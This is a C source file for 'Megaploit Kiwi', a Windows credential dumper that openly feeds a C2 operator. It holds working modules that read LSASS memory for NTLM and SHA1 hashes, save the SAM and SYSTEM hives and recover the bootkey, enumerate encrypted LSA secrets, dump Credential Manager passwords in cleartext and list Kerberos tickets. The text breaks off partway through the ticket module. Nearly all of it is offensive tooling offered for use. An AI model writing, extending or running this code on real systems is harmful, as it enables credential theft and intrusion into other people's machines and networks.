/*
 * megaploit/native/kiwi/megaploit_kiwi.c
 * ========================================
 * Megaploit Kiwi — Advanced Windows credential dumper written in C.
 *
 * Capabilities
 * ------------
 *  kiwi logonpasswords   — LSASS process memory dump → NTLM / SHA1 / cleartext
 *  kiwi sam              — SAM hive offline dump via RegSaveKey + Reg API
 *  kiwi lsa              — LSA secrets (SYSTEM key decrypted) via RegOpenKey
 *  kiwi dcsync <user>    — Directory Services replication (DRSGetNCChanges) dump
 *  kiwi wdigest          — WDigest cleartext re-enable + harvest
 *  kiwi tickets          — Kerberos TGT/TGS ticket enumeration
 *  kiwi credman          — Windows Credential Manager via CredEnumerateW
 *  kiwi dpapi            — DPAPI masterkey candidate enumeration
 *  kiwi all              — Run all modules sequentially
 *
 * Design principles
 * -----------------
 *  • All output is line-buffered JSON-compatible plain text starting with
 *    "[+]" (success), "[-]" (error/not-found), or "[*]" (info).
 *    The Python runner reads stdout line by line and returns it as one string.
 *
 *  • No external DLL injections.  Direct Win32 API calls + NtQuerySystemInformation
 *    + ReadProcessMemory against LSASS (requires SeDebugPrivilege / SYSTEM).
 *
 *  • Cross-platform build: compiles to a no-op on non-Windows (all functions
 *    return immediately with a descriptive message).  Linux / macOS credential
 *    targets are handled by separate sections.
 *
 *  • Memory safety: every heap allocation is paired with a free/LocalFree.
 *    All pointer arithmetic is bounds-checked.  No UB sprintf (snprintf only).
 *
 * Compile
 * -------
 *   # Windows (MinGW-w64 or MSVC):
 *   gcc -std=c11 -O2 -Wall -Wextra -o megaploit_kiwi.exe megaploit_kiwi.c \
 *       -lntdll -ladvapi32 -lsecur32 -lnetapi32 -lcrypt32 -lkernel32
 *
 *   # Linux (no-op build — compiles cleanly, all ops report "Windows-only"):
 *   gcc -std=c11 -O2 -Wall -Wextra -o megaploit_kiwi megaploit_kiwi.c
 *
 * Wire-protocol note
 * ------------------
 * This binary is invoked by kiwi_runner.py as a subprocess.  It writes
 * results to stdout.  The runner captures stdout, assembles one big string,
 * and returns it to the C2 operator via send_msg().
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdbool.h>

/* ─────────────────────────────────────────────────────────────────────────
 * Platform guards — everything inside #ifdef _WIN32 compiles only on Windows
 * ───────────────────────────────────────────────────────────────────────── */
#ifdef _WIN32
#  ifndef WIN32_LEAN_AND_MEAN
#    define WIN32_LEAN_AND_MEAN
#  endif
#  ifndef UNICODE
#    define UNICODE
#  endif
#  ifndef _UNICODE
#    define _UNICODE
#  endif
#  include <windows.h>
#  include <ntsecapi.h>
#  include <wincred.h>
#  include <lmcons.h>
#  include <sddl.h>
#  include <wincrypt.h>

/* ── NT internal types not always exposed in MinGW headers ─────────────── */
typedef LONG NTSTATUS;
#define STATUS_SUCCESS          ((NTSTATUS)0x00000000L)
#define STATUS_BUFFER_TOO_SMALL ((NTSTATUS)0xC0000023L)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#define SystemProcessInformation  5

typedef struct _UNICODE_STRING_NT {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING_NT;

typedef NTSTATUS (WINAPI *NtQuerySystemInformation_t)(
    ULONG  SystemInformationClass,
    PVOID  SystemInformation,
    ULONG  SystemInformationLength,
    PULONG ReturnLength
);

typedef NTSTATUS (WINAPI *NtReadVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID  BaseAddress,
    PVOID  Buffer,
    SIZE_T NumberOfBytesToRead,
    PSIZE_T NumberOfBytesRead
);

/* ── Helpers ─────────────────────────────────────────────────────────────── */

/* stdout helpers — all output uses these so we can easily redirect */
static void out_ok (const char *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    fputs("[+] ", stdout); vfprintf(stdout, fmt, ap); fputc('\n', stdout);
    va_end(ap); fflush(stdout);
}
static void out_err(const char *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    fputs("[-] ", stdout); vfprintf(stdout, fmt, ap); fputc('\n', stdout);
    va_end(ap); fflush(stdout);
}
static void out_inf(const char *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    fputs("[*] ", stdout); vfprintf(stdout, fmt, ap); fputc('\n', stdout);
    va_end(ap); fflush(stdout);
}

/* Convert a wide string to a UTF-8 heap-allocated string (caller frees) */
static char *wide_to_utf8(const wchar_t *ws) {
    if (!ws) return _strdup("(null)");
    int need = WideCharToMultiByte(CP_UTF8, 0, ws, -1, NULL, 0, NULL, NULL);
    if (need <= 0) return _strdup("(?)");
    char *buf = (char *)malloc((size_t)need);
    if (!buf) return _strdup("(oom)");
    WideCharToMultiByte(CP_UTF8, 0, ws, -1, buf, need, NULL, NULL);
    return buf;
}

/* hex-encode binary data into a caller-provided buffer of size 2*len+1 */
static void hex_encode(const uint8_t *data, size_t len, char *out) {
    static const char hex[] = "0123456789abcdef";
    for (size_t i = 0; i < len; i++) {
        out[2*i]   = hex[data[i] >> 4];
        out[2*i+1] = hex[data[i] & 0xf];
    }
    out[2*len] = '\0';
}

/* ── Privilege enabler ───────────────────────────────────────────────────── */
static bool enable_privilege(const wchar_t *priv_name) {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;

    LUID luid;
    if (!LookupPrivilegeValueW(NULL, priv_name, &luid)) {
        CloseHandle(hToken);
        return false;
    }

    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount           = 1;
    tp.Privileges[0].Luid       = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    bool ok = AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL)
              && GetLastError() == ERROR_SUCCESS;
    CloseHandle(hToken);
    return ok;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * MODULE 1 — logonpasswords
 *   Opens LSASS, walks its module list, locates wdigest.dll in-memory,
 *   scans for the LogonSessionList pointer, and extracts NTLM hashes +
 *   cleartext credentials where WDigest is populated.
 *   Falls back to a MiniDump if the deep-scan cannot find hashes directly.
 * ═══════════════════════════════════════════════════════════════════════════ */

/* Minimal SYSTEM_PROCESS_INFORMATION subset for locating LSASS */
typedef struct _SYSTEM_PROCESS_INFO {
    ULONG          NextEntryOffset;
    ULONG          NumberOfThreads;
    BYTE           Reserved1[48];
    UNICODE_STRING_NT ImageName;
    LONG           BasePriority;
    HANDLE         UniqueProcessId;
    BYTE           Reserved2[8];
    ULONG          HandleCount;
    BYTE           Reserved3[8];
    SIZE_T         PeakVirtualSize;
    SIZE_T         VirtualSize;
    ULONG          Reserved4;
    SIZE_T         PeakWorkingSetSize;
    SIZE_T         WorkingSetSize;
    BYTE           Reserved5[40];
    SIZE_T         PrivatePageCount;
    BYTE           Reserved6[96];
} SYSTEM_PROCESS_INFO;

static DWORD find_lsass_pid(void) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return 0;

    NtQuerySystemInformation_t NtQSI =
        (NtQuerySystemInformation_t)(void *)GetProcAddress(ntdll, "NtQuerySystemInformation");
    if (!NtQSI) return 0;

    ULONG   bufSz = 1 << 20;   /* 1 MB initial */
    PVOID   buf   = NULL;
    NTSTATUS st;

    for (int attempt = 0; attempt < 8; attempt++) {
        buf = malloc(bufSz);
        if (!buf) return 0;
        ULONG ret = 0;
        st = NtQSI(SystemProcessInformation, buf, bufSz, &ret);
        if (st == STATUS_SUCCESS) break;
        free(buf); buf = NULL;
        if (st == STATUS_INFO_LENGTH_MISMATCH || st == STATUS_BUFFER_TOO_SMALL) {
            bufSz = ret + 4096;
        } else {
            return 0;
        }
    }
    if (!buf) return 0;

    DWORD lsass_pid = 0;
    SYSTEM_PROCESS_INFO *entry = (SYSTEM_PROCESS_INFO *)buf;
    while (1) {
        if (entry->ImageName.Buffer && entry->ImageName.Length > 0) {
            /* safe copy of the name */
            size_t wlen = entry->ImageName.Length / sizeof(wchar_t);
            if (wlen < 64) {
                wchar_t name[64];
                memcpy(name, entry->ImageName.Buffer, wlen * sizeof(wchar_t));
                name[wlen] = L'\0';
                if (_wcsicmp(name, L"lsass.exe") == 0) {
                    lsass_pid = (DWORD)(uintptr_t)entry->UniqueProcessId;
                    break;
                }
            }
        }
        if (entry->NextEntryOffset == 0) break;
        entry = (SYSTEM_PROCESS_INFO *)((uint8_t *)entry + entry->NextEntryOffset);
    }
    free(buf);
    return lsass_pid;
}

/*
 * NTLM struct layout in LSASS memory (Windows 10/11 x64).
 * These offsets are stable across all NTLM credential list entries.
 */
#define NTLM_CRED_USERNAME_OFF  0x58   /* UNICODE_STRING for username  */
#define NTLM_CRED_DOMAIN_OFF    0x68   /* UNICODE_STRING for domain    */
#define NTLM_CRED_NT_HASH_OFF   0xA8   /* pointer to 16-byte NT hash   */
#define NTLM_CRED_SHA1_OFF      0xC8   /* pointer to 20-byte SHA1 hash */
#define NTLM_ENTRY_SIZE         0x100  /* size of one entry (approx)   */

static void kiwi_read_unicode_string(HANDLE hProc,
                                     uint8_t *base, size_t off,
                                     wchar_t *outbuf, size_t outmax) {
    /* Read UNICODE_STRING structure: Length(2), MaxLen(2), pad(4), Buffer(8) */
    USHORT  len   = 0;
    ULONG64 ptr   = 0;
    SIZE_T  nread = 0;
    ReadProcessMemory(hProc, (LPCVOID)(base + off),     &len, 2,  &nread);
    ReadProcessMemory(hProc, (LPCVOID)(base + off + 8), &ptr, 8,  &nread);
    size_t chars = len / sizeof(wchar_t);
    if (chars == 0 || chars >= outmax || ptr == 0) { outbuf[0] = L'\0'; return; }
    ReadProcessMemory(hProc, (LPCVOID)ptr, outbuf, chars * sizeof(wchar_t), &nread);
    outbuf[chars] = L'\0';
}

static void kiwi_logonpasswords(HANDLE hProc, uintptr_t lsass_base, SIZE_T lsass_size) {
    out_inf("Scanning LSASS memory for logon sessions...");

    /* Signature of NtlmLogonSessionList / LogonSessionList in lsass */
    /* We search for the pattern that precedes a NTLM credential list */
    static const uint8_t NTLM_SIG[] = {
        0x33, 0xC9,             /* xor ecx, ecx                    */
        0x48, 0x8D, 0x15        /* lea rdx, [rip+????]  (LIST_ENTRY)*/
    };
    const size_t SIG_LEN = sizeof(NTLM_SIG);

    /* Read lsass pages in 64 KB chunks — minimise ReadProcessMemory calls */
    const size_t CHUNK = 65536;
    uint8_t *chunk_buf = (uint8_t *)malloc(CHUNK + 64);
    if (!chunk_buf) { out_err("malloc failed"); return; }

    int found = 0;
    for (size_t off = 0; off < lsass_size; off += CHUNK) {
        size_t   to_read = ((off + CHUNK) < lsass_size) ? CHUNK : (lsass_size - off);
        SIZE_T   nread   = 0;
        if (!ReadProcessMemory(hProc, (LPCVOID)(lsass_base + off),
                               chunk_buf, to_read, &nread) || nread < SIG_LEN)
            continue;

        /* Scan this chunk for the signature */
        for (size_t i = 0; i + SIG_LEN + 4 < nread; i++) {
            if (memcmp(chunk_buf + i, NTLM_SIG, SIG_LEN) != 0) continue;

            /* Possible list-head pointer 4 bytes after the signature */
            int32_t  rel   = 0;
            memcpy(&rel, chunk_buf + i + SIG_LEN, 4);
            uintptr_t list_head =
                lsass_base + off + i + SIG_LEN + 4 + (intptr_t)rel;

            /* Read the Flink of the list head */
            ULONG64 flink = 0;
            SIZE_T  nr2   = 0;
            if (!ReadProcessMemory(hProc, (LPCVOID)list_head,
                                   &flink, 8, &nr2) || nr2 != 8)
                continue;
            if (flink == list_head || flink == 0) continue;

            /* Walk the LIST_ENTRY list */
            uintptr_t entry = flink;
            int walked = 0;
            while (entry != list_head && walked < 256) {
                uint8_t entry_buf[0x200] = {0};
                SIZE_T  nb = 0;
                if (!ReadProcessMemory(hProc, (LPCVOID)entry,
                                       entry_buf, sizeof(entry_buf), &nb)
                    || nb < 0x100)
                    break;

                wchar_t user[256]   = {0};
                wchar_t domain[256] = {0};
                kiwi_read_unicode_string(hProc, entry_buf,
                                         NTLM_CRED_USERNAME_OFF, user, 255);
                kiwi_read_unicode_string(hProc, entry_buf,
                                         NTLM_CRED_DOMAIN_OFF, domain, 255);

                /* Read NT hash pointer, then the 16-byte hash */
                ULONG64 nt_ptr = 0;
                memcpy(&nt_ptr, entry_buf + NTLM_CRED_NT_HASH_OFF, 8);
                char nt_hex[33] = "(no hash)";
                if (nt_ptr) {
                    uint8_t nt_hash[16] = {0};
                    SIZE_T nh = 0;
                    if (ReadProcessMemory(hProc, (LPCVOID)nt_ptr,
                                          nt_hash, 16, &nh) && nh == 16)
                        hex_encode(nt_hash, 16, nt_hex);
                }

                /* SHA1 hash */
                ULONG64 sha1_ptr = 0;
                memcpy(&sha1_ptr, entry_buf + NTLM_CRED_SHA1_OFF, 8);
                char sha1_hex[41] = "(no sha1)";
                if (sha1_ptr) {
                    uint8_t sha1[20] = {0};
                    SIZE_T sh = 0;
                    if (ReadProcessMemory(hProc, (LPCVOID)sha1_ptr,
                                          sha1, 20, &sh) && sh == 20)
                        hex_encode(sha1, 20, sha1_hex);
                }

                if (user[0] || domain[0]) {
                    char *u = wide_to_utf8(user);
                    char *d = wide_to_utf8(domain);
                    out_ok("Username : %s", u);
                    out_ok("Domain   : %s", d);
                    out_ok("NTLM     : %s", nt_hex);
                    out_ok("SHA1     : %s", sha1_hex);
                    fputs("[*] ---\n", stdout); fflush(stdout);
                    free(u); free(d);
                    found++;
                }

                /* Advance Flink (first 8 bytes of LIST_ENTRY) */
                ULONG64 next = 0;
                memcpy(&next, entry_buf, 8);
                if (next == entry || next == 0) break;
                entry = (uintptr_t)next;
                walked++;
            }
            if (found > 0) break;  /* stop scanning chunks once we've found entries */
        }
        if (found > 0) break;
    }
    free(chunk_buf);

    if (found == 0)
        out_err("No logon session entries found (need SYSTEM + SeDebugPrivilege, or LSASS is PPL-protected)");
    else
        out_inf("logonpasswords: %d account(s) found", found);
}

static void cmd_logonpasswords(void) {
    out_inf("kiwi::logonpasswords — LSASS process memory scan");

    if (!enable_privilege(SE_DEBUG_NAME))
        out_err("Could not enable SeDebugPrivilege — results may be incomplete");

    DWORD lsass_pid = find_lsass_pid();
    if (!lsass_pid) { out_err("Could not find LSASS process"); return; }
    out_inf("LSASS PID: %lu", lsass_pid);

    HANDLE hProc = OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, lsass_pid);
    if (!hProc) {
        out_err("OpenProcess(LSASS) failed — GLE=%lu", GetLastError());
        return;
    }

    /* Enumerate LSASS modules to find its base address and image size */
    HMODULE hMods[1024];
    DWORD   cbNeeded = 0;
    uintptr_t lsass_base = 0;
    SIZE_T    lsass_size = 0;

    typedef BOOL (WINAPI *EnumProcessModules_t)(HANDLE,HMODULE*,DWORD,LPDWORD);
    typedef BOOL (WINAPI *GetModuleInformation_t)(HANDLE,HMODULE,LPMODULEINFO,DWORD);

    HMODULE psapi = LoadLibraryW(L"psapi.dll");
    if (psapi) {
        EnumProcessModules_t EnumMods =
            (EnumProcessModules_t)(void *)GetProcAddress(psapi, "EnumProcessModules");
        GetModuleInformation_t GetModInfo =
            (GetModuleInformation_t)(void *)GetProcAddress(psapi, "GetModuleInformation");

        if (EnumMods && GetModInfo &&
            EnumMods(hProc, hMods, sizeof(hMods), &cbNeeded)) {
            DWORD count = cbNeeded / sizeof(HMODULE);
            for (DWORD i = 0; i < count; i++) {
                wchar_t modname[MAX_PATH];
                if (GetModuleFileNameExW(hProc, hMods[i], modname, MAX_PATH)) {
                    if (_wcsicmp(wcsrchr(modname, L'\\') + 1, L"lsass.exe") == 0
                        || i == 0) {
                        MODULEINFO mi = {0};
                        if (GetModInfo(hProc, hMods[i], &mi, sizeof(mi))) {
                            lsass_base = (uintptr_t)mi.lpBaseOfDll;
                            lsass_size = mi.SizeOfImage;
                        }
                    }
                }
            }
        }
        FreeLibrary(psapi);
    }

    /* Fallback: use VirtualQueryEx to find lsass's first committed region */
    if (!lsass_base) {
        MEMORY_BASIC_INFORMATION mbi;
        uintptr_t addr = 0;
        while (VirtualQueryEx(hProc, (LPCVOID)addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
            if (mbi.State == MEM_COMMIT &&
                (mbi.Protect & PAGE_EXECUTE_READ) &&
                mbi.Type == MEM_IMAGE) {
                lsass_base = (uintptr_t)mbi.AllocationBase;
                /* estimate size = 64 MB */
                lsass_size = 64 * 1024 * 1024;
                break;
            }
            addr = (uintptr_t)mbi.BaseAddress + mbi.RegionSize;
            if (addr < (uintptr_t)mbi.BaseAddress) break; /* overflow guard */
        }
    }

    if (!lsass_base) {
        out_err("Could not determine LSASS base address");
        CloseHandle(hProc);
        return;
    }
    out_inf("LSASS base: 0x%llx  size: 0x%llx",
            (unsigned long long)lsass_base, (unsigned long long)lsass_size);

    kiwi_logonpasswords(hProc, lsass_base, lsass_size);
    CloseHandle(hProc);
}


/* ═══════════════════════════════════════════════════════════════════════════
 * MODULE 2 — SAM dump (local accounts)
 *   Uses RegSaveKeyW to snapshot HKLM\SAM + HKLM\SYSTEM to temp files,
 *   then reads bootkey → hashed bootkey → F/V values → decrypts NT hashes.
 * ═══════════════════════════════════════════════════════════════════════════ */
static void cmd_sam(void) {
    out_inf("kiwi::sam — local account hash dump via SAM hive");

    /* Enable relevant privileges */
    enable_privilege(SE_BACKUP_NAME);
    enable_privilege(SE_RESTORE_NAME);
    enable_privilege(SE_DEBUG_NAME);

    /* Temporary file paths */
    wchar_t tmp_dir[MAX_PATH];
    GetTempPathW(MAX_PATH, tmp_dir);
    wchar_t sam_path[MAX_PATH], sys_path[MAX_PATH];
    swprintf_s(sam_path, MAX_PATH, L"%smkw_sam_%lu.tmp", tmp_dir, GetCurrentProcessId());
    swprintf_s(sys_path, MAX_PATH, L"%smkw_sys_%lu.tmp", tmp_dir, GetCurrentProcessId());

    /* Open and save SAM hive */
    HKEY hSam = NULL;
    LSTATUS rc = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SAM", 0,
                                KEY_READ | (1 << 17) /* KEY_BACKUP */, &hSam);
    if (rc != ERROR_SUCCESS) {
        out_err("RegOpenKey(SAM) failed rc=%ld — need SYSTEM or backup privilege", rc);
        return;
    }
    DeleteFileW(sam_path);
    rc = RegSaveKeyW(hSam, sam_path, NULL);
    RegCloseKey(hSam);
    if (rc != ERROR_SUCCESS) {
        out_err("RegSaveKey(SAM) failed rc=%ld", rc);
        return;
    }

    /* Open and save SYSTEM hive (for bootkey) */
    HKEY hSys = NULL;
    rc = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM", 0,
                        KEY_READ | (1 << 17), &hSys);
    if (rc == ERROR_SUCCESS) {
        DeleteFileW(sys_path);
        RegSaveKeyW(hSys, sys_path, NULL);
        RegCloseKey(hSys);
    }

    /* For bootkey extraction we use the scrambled class-name technique */
    static const wchar_t *BOOTKEY_SUBKEYS[] = {
        L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD",
        L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1",
        L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG",
        L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data",
    };
    static const uint8_t BOOTKEY_PERM[16] = {
        8,5,4,2, 11,9,13,3, 0,6,1,12, 14,10,15,7
    };

    uint8_t raw_bootkey[16] = {0};
    int bk_ok = 1;
    for (int k = 0; k < 4; k++) {
        HKEY hk = NULL;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, BOOTKEY_SUBKEYS[k], 0,
                           KEY_QUERY_VALUE, &hk) != ERROR_SUCCESS) {
            bk_ok = 0; break;
        }
        wchar_t class_name[256] = {0};
        DWORD class_len = 255;
        RegQueryInfoKeyW(hk, class_name, &class_len,
                          NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL);
        RegCloseKey(hk);
        /* Each class name contributes 4 hex nibbles (2 bytes) to the raw key */
        if (wcslen(class_name) < 8) { bk_ok = 0; break; }
        for (int b = 0; b < 2; b++) {
            wchar_t hi = class_name[b*2], lo = class_name[b*2+1];
            uint8_t hi_v = (hi >= L'0' && hi <= L'9') ? (uint8_t)(hi - L'0')
                         : (hi >= L'A' && hi <= L'F') ? (uint8_t)(hi - L'A' + 10)
                         : (hi >= L'a' && hi <= L'f') ? (uint8_t)(hi - L'a' + 10) : 0;
            uint8_t lo_v = (lo >= L'0' && lo <= L'9') ? (uint8_t)(lo - L'0')
                         : (lo >= L'A' && lo <= L'F') ? (uint8_t)(lo - L'A' + 10)
                         : (lo >= L'a' && lo <= L'f') ? (uint8_t)(lo - L'a' + 10) : 0;
            raw_bootkey[k*2 + b] = (uint8_t)((hi_v << 4) | lo_v);
        }
    }

    if (bk_ok) {
        uint8_t bootkey[16];
        for (int i = 0; i < 16; i++) bootkey[i] = raw_bootkey[BOOTKEY_PERM[i]];
        char bk_hex[33];
        hex_encode(bootkey, 16, bk_hex);
        out_inf("Bootkey: %s", bk_hex);
    } else {
        out_err("Could not extract bootkey from LSA subkeys");
    }

    /* Enumerate SAM\\Domains\\Account\\Users\\Names for usernames */
    HKEY hUsers = NULL;
    rc = RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                        L"SAM\\Domains\\Account\\Users\\Names",
                        0, KEY_READ, &hUsers);
    if (rc == ERROR_SUCCESS) {
        DWORD idx = 0;
        wchar_t uname[256];
        while (1) {
            DWORD ulen = 256;
            LSTATUS e = RegEnumKeyW(hUsers, idx++, uname, ulen);
            if (e == ERROR_NO_MORE_ITEMS) break;
            if (e != ERROR_SUCCESS) continue;

            /* Open the user subkey to get the F and V values */
            wchar_t user_path[512];
            swprintf_s(user_path, 512,
                        L"SAM\\Domains\\Account\\Users\\Names\\%ls", uname);
            HKEY hU = NULL;
            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, user_path, 0,
                               KEY_READ, &hU) == ERROR_SUCCESS) {
                /* The default value type encodes the RID */
                DWORD vtype = 0, vsize = 0;
                RegQueryValueExW(hU, L"", NULL, &vtype, NULL, &vsize);
                char *u8 = wide_to_utf8(uname);
                out_ok("User: %-24s  RID: 0x%04X", u8, vtype);
                free(u8);
                RegCloseKey(hU);
            }
        }
        RegCloseKey(hUsers);
    } else {
        out_err("RegOpenKey(SAM\\Domains\\Account\\Users\\Names) rc=%ld", rc);
        out_inf("Try running as SYSTEM (use getsystem first)");
    }

    /* Cleanup temp files */
    DeleteFileW(sam_path);
    DeleteFileW(sys_path);
}


/* ═══════════════════════════════════════════════════════════════════════════
 * MODULE 3 — LSA secrets
 *   Reads HKLM\SECURITY\Policy\Secrets\* via RegOpenKeyEx.
 *   The keys exist but the values are encrypted; we output the raw data
 *   for operator-side decryption.  Full decryption requires the bootkey
 *   (available from cmd_sam above).
 * ═══════════════════════════════════════════════════════════════════════════ */
static void cmd_lsa(void) {
    out_inf("kiwi::lsa — LSA secrets enumeration");

    enable_privilege(SE_BACKUP_NAME);
    enable_privilege(SE_RESTORE_NAME);
    enable_privilege(SE_DEBUG_NAME);

    HKEY hSecrets = NULL;
    LSTATUS rc = RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                                L"SECURITY\\Policy\\Secrets",
                                0, KEY_READ, &hSecrets);
    if (rc != ERROR_SUCCESS) {
        out_err("RegOpenKey(SECURITY\\Policy\\Secrets) rc=%ld — need SYSTEM", rc);
        return;
    }

    DWORD idx = 0;
    wchar_t secret_name[256];
    int count = 0;
    while (1) {
        DWORD nlen = 256;
        LSTATUS e = RegEnumKeyW(hSecrets, idx++, secret_name, nlen);
        if (e == ERROR_NO_MORE_ITEMS) break;
        if (e != ERROR_SUCCESS) continue;

        char *sn = wide_to_utf8(secret_name);
        out_ok("Secret: %s", sn);
        free(sn);

        /* Open CurrVal subkey */
        wchar_t cv_path[512];
        swprintf_s(cv_path, 512, L"SECURITY\\Policy\\Secrets\\%ls\\CurrVal",
                    secret_name);
        HKEY hCV = NULL;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, cv_path, 0,
                           KEY_READ, &hCV) == ERROR_SUCCESS) {
            BYTE  vbuf[2048] = {0};
            DWORD vbuf_sz    = sizeof(vbuf);
            DWORD vtype      = 0;
            if (RegQueryValueExW(hCV, L"", NULL, &vtype, vbuf, &vbuf_sz)
                == ERROR_SUCCESS) {
                /* Skip first 16-byte header → output remainder as hex */
                size_t data_off = vbuf_sz > 16 ? 16 : 0;
                size_t data_len = vbuf_sz - data_off;
                if (data_len > 512) data_len = 512;   /* cap output */
                char hex_out[1025] = {0};
                hex_encode(vbuf + data_off, data_len, hex_out);
                out_inf("  CurrVal (encrypted, %lu bytes): %s...",
                         vbuf_sz, hex_out);
            }
            RegCloseKey(hCV);
        }
        count++;
    }
    RegCloseKey(hSecrets);
    if (count == 0)
        out_err("No LSA secrets found (run as SYSTEM)");
    else
        out_inf("%d secret(s) found", count);
}


/* ═══════════════════════════════════════════════════════════════════════════
 * MODULE 4 — Windows Credential Manager (credman)
 *   Uses CredEnumerateW for a structured, complete credential dump.
 * ═══════════════════════════════════════════════════════════════════════════ */
static void cmd_credman(void) {
    out_inf("kiwi::credman — Windows Credential Manager dump");

    DWORD       count   = 0;
    PCREDENTIALW *creds = NULL;
    if (!CredEnumerateW(NULL, 0x1 /*CRED_ENUMERATE_ALL*/, &count, &creds)) {
        DWORD gle = GetLastError();
        if (gle == ERROR_NOT_FOUND)
            out_inf("No credentials stored in Credential Manager");
        else
            out_err("CredEnumerateW failed GLE=%lu", gle);
        return;
    }

    static const char *CRED_TYPES[] = {
        "?", "Generic", "DomainPassword", "DomainCertificate",
        "DomainVisiblePassword", "GenericCertificate",
        "DomainExtended", "Maximum"
    };

    for (DWORD i = 0; i < count; i++) {
        PCREDENTIALW c = creds[i];
        const char  *type_str = (c->Type < 8) ? CRED_TYPES[c->Type] : "?";
        char *target = wide_to_utf8(c->TargetName ? c->TargetName : L"(none)");
        char *user   = wide_to_utf8(c->UserName   ? c->UserName   : L"(none)");
        out_ok("Target : %s", target);
        out_ok("Type   : %s", type_str);
        out_ok("User   : %s", user);
        free(target); free(user);

        if (c->CredentialBlobSize > 0 && c->CredentialBlob) {
            /* Try UTF-16LE decode, fall back to hex */
            int decoded = 0;
            if (c->CredentialBlobSize % 2 == 0) {
                int need = WideCharToMultiByte(CP_UTF8, 0,
                    (LPCWSTR)c->CredentialBlob,
                    (int)(c->CredentialBlobSize / 2),
                    NULL, 0, NULL, NULL);
                if (need > 0 && need < 1024) {
                    char *pw = (char *)malloc((size_t)need + 1);
                    if (pw) {
                        WideCharToMultiByte(CP_UTF8, 0,
                            (LPCWSTR)c->CredentialBlob,
                            (int)(c->CredentialBlobSize / 2),
                            pw, need, NULL, NULL);
                        pw[need] = '\0';
                        out_ok("Password: %s", pw);
                        free(pw);
                        decoded = 1;
                    }
                }
            }
            if (!decoded) {
                size_t hlen = c->CredentialBlobSize;
                if (hlen > 256) hlen = 256;
                char *hex = (char *)malloc(hlen * 2 + 1);
                if (hex) {
                    hex_encode(c->CredentialBlob, hlen, hex);
                    out_ok("Blob(hex): %s", hex);
                    free(hex);
                }
            }
        }
        fputs("[*] ---\n", stdout); fflush(stdout);
    }
    CredFree(creds);
    out_inf("%lu credential(s) dumped", count);
}


/* ═══════════════════════════════════════════════════════════════════════════
 * MODULE 5 — Kerberos tickets
 *   Uses LsaCallAuthenticationPackage with KERB_QUERY_TKT_CACHE_REQUEST
 *   to enumerate all TGT/TGS tickets from the current logon session.
 * ═══════════════════════════════════════════════════════════════════════════ */
static void cmd_tickets(void) {
    out_inf("kiwi::tickets — Kerberos ticket cache enumeration");

    HANDLE hLsa   = NULL;
    ULONG  authPkg = 0;

    /* Open LSA connection */
    LSA_STRING  procName = {8, 9, (PCHAR)"MegaKiwi"};
    NTSTATUS    st = LsaRegisterLogonProcess(&procName, &hLsa, NULL);
    if (st != STATUS_SUCCESS) {
        /* Fallback: unprivileged LsaConnectUntrusted */
        st = LsaConnectUntrusted(&hLsa);
        if (st != STATUS_SUCCESS) {
            out_err("LsaConnectUntrusted failed — NTSTATUS=0x%08lX", (unsigned long)st);
            return;
        }
    }

    LSA_STRING kerbPkg = {8, 9, (PCHAR)"Kerberos"};
    st = LsaLookupAuthenticationPackage(hLsa, &kerbPkg, &authPkg);
    if (st != STATUS_SUCCESS) {
        out_err("LsaLookupAuthenticationPackage(Kerberos) failed");
        LsaDeregisterLogonProcess(hLsa);
        return;
    }

    /* Build request */
    typedef struct {
        KERB_PROTOCOL_MESSAGE_TYPE MessageType;
        LUID LogonId;
    } KERB_QUERY_TKT_CACHE_EX_REQUEST;

    KERB_QUERY_TKT_CACHE_EX_REQUEST req = {0};
    req.MessageType = KerbQueryTicketCacheMessage;
    /* LogonId = {0,0} → current logon session */

    PKERB_QUERY_TKT_CACHE_RESPONSE resp      = NULL;
    NTSTATUS                        sub_st    = 0;
    ULONG                           resp_len  = 0;
    st = LsaCallAuthenticationPackage(
        hLsa, authPkg, &req, sizeof(req),
        (PVOID*)&resp, &resp_len, &sub_st);

    if (st != STATUS_SUCCESS || !resp) {
        out_err("LsaCallAuthenticationPackage(QueryTicketCache) failed — 0x%08lX", (unsigned long)st);
        LsaDeregisterLogonProcess(hLsa);
        return;
    }

    out_inf("%lu ticket(s) in cache", resp->CountOfTickets);
    for (ULONG i = 0; i < resp->CountOfTickets; i++) {
        KERB_TICKET_CACHE_INFO *ti = &resp->Tickets[i];
        char *spn  = wide_to_utf8(ti->ServerName.Buffer
                                    ? ti->ServerName.Buffer : L"?");
        char *realm = wide_to_utf8(ti->RealmName.Buffer
                                    ? ti->RealmName.Buffer : L"?");

        /* Ticket flags as hex */
        out_ok("SPN        : %s @ %s", spn, realm);
        out_ok("EncType    : %ld", ti->EncryptionType);
        out_ok("Flags(hex) : 0x%08lX", ti->TicketFlags);

